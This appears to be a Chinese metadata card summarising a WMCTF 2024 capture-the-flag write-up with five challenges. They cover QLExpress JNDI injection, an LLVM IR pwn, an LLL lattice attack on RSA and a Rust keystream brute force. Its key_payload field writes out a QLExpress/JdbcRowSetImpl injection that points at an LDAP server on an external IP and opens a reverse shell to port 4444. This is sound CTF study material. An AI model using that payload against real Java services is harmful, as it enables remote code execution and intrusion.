---
title: WMCTF 2024 Writeup
contest: WMCTF 2024
year: 2024
difficulty: hard
vuln_type: web_unknown
tags: [qlexpress_jndi, jdbc_rowset, ldap_log4shell, llvm_ir_pwn, k_cessation_wheel, lll_diophantine_rsa, rust_box_sbox, msf_shell]
attack_chain: EzQl:QLExpress 触发 JdbcRowSetImpl.dataSourceName=ldap:// 反弹 shell / babysign:LLVM IR 自定义函数 WMCTF_OPEN/READ/WRITE → f0-f6 链式调用读 ./flag / K-Cessation:64 位转轮 + 密文约束解 wheel + 20 维 Ge 矩阵 LLL 攻 p,q (Th3_Simultaneous_Diophantine) / RustAndroid:密钥流 XOR + box S-box + 0x10 倍数浮动爆破 / give_your_shell1/2:MSF shell
key_payload: a.dataSourceName="ldap://112.124.59.213:1389/Deserialize/CommonsBeanutils194/ReverseShell/112.124.59.213/4444"; a.autoCommit=true; / Ge[0,0]=2^480; for i in range(1,20): Ge[i,i]=-n; Ge[0,i]=s[i]
one_liner: WMCTF 2024 星盟安全 5 题 WP，QLExpress JNDI+LDAP 反弹 shell + LLVM IR 调用链 + K-Cessation 64 位转轮方程组求解 + LLL 同余 Diophantine + Rust 密钥流爆破。
lesson: QLExpress 阿里 QL 表达式求值器触发任意 setter/getter 是 2024 新型 RCE 入口；K-Cessation 加密中"密文值揭示 wheel 局部关系"是解方程的关键。
quality: high
---
